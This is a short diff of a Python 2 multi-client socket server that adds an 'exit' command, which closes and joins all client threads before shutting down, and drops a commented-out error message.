@@ -28,14 +28,13 @@ class Server:
         except socket.error, (value,message):
             if self.server:
                 self.server.close()
-            #print "[!] Could not open static socket: " + message
             sys.exit(1)
 
     def run(self):
         sys.stdout.write("> ")
         self.open_socket()
         self.input = [self.server,sys.stdin]
-        commands = {"quit": exit, "status": self.status, "porttimeout": self.changePortTimeout, "sendpy": self.sendPython}
+        commands = {"quit": exit, "status": self.status, "porttimeout": self.changePortTimeout, "sendpy": self.sendPython, "exit": self.exit}
         running = 1
         while running:
             inputready,outputready,exceptready = select.select(self.input,[],[],1)
@@ -83,6 +82,12 @@ class Server:
         print "\n---CLIENTS---"
         for i in self.rollingthreads:
             print "Thread ID:", i.thread_id, "[", i.address, "]"
+
+    def exit(self):
+        for i in self.rollingthreads:
+            i.client.close()
+            i.join()
+        exit()
 
 
 class RollingClient(threading.Thread):
